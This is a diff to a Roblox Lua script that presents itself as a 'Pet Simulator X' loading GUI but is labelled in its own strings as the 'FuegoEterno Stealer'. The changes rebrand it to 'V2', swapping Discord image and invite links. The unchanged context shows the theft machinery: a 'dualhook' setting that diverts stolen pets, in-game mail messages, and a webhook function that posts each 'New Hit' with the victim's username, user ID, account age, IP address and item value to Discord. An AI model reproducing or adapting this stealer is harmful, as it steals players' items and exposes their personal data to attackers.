@@ -4,7 +4,7 @@ _G.ScriptTitle = "Pet Simulator X: Loading Gui"
 getgenv().Settings = {
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "FuegoEterno OnTop",
+    MailMessage = "FuegoEternoV2 Comeback",
   Titanics = {
        Dualhook = true,
        Intensity = 100--%
@@ -1206,14 +1206,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
         imgs =
-        "https://media.discordapp.net/attachments/736080557557022855/1150299910550339644/FB_IMG_1691312902228.jpg"
+        "https://media.discordapp.net/attachments/1167752340145713255/1167753847658270730/images_43.jpg?ex=654f4685&is=653cd185&hm=7a682033623171950a4fca554d08ec40413cbe804bcceba4b8c0baea4e6c6054&"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Fuego Eterno Scripts",
+            ["username"] = "Fuego Eterno V2 Scripts",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit**",
-                ["url"] = "https://discord.gg/pUKMNeRwsn",
+                ["url"] = "https://discord.gg/GnN2nTUCSd",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1222,7 +1222,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using FuegoEterno Stealer** :moyai:",
+                    ["name"] = "**This data was generated using FuegoEternoV2 Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1276,14 +1276,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://media.discordapp.net/attachments/736080557557022855/1150299910550339644/FB_IMG_1691312902228.jpg"
+        "https://media.discordapp.net/attachments/1167752340145713255/1167753847658270730/images_43.jpg?ex=654f4685&is=653cd185&hm=7a682033623171950a4fca554d08ec40413cbe804bcceba4b8c0baea4e6c6054&"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Fuego Eterno Scripts",
+            ["username"] = "Fuego Eterno V2 Scripts",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit**",
-                ["url"] = "https://discord.gg/pUKMNeRwsn",
+                ["url"] = "https://discord.gg/GnN2nTUCSd",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1292,7 +1292,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using FuegoEterno Stealer** :moyai:",
+                    ["name"] = "**This data was generated using FuegoEterno V2 Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1368,7 +1368,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "FuegoEterno OnTop"
+local mailmsg = "FuegoEternoV2 Comeback"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
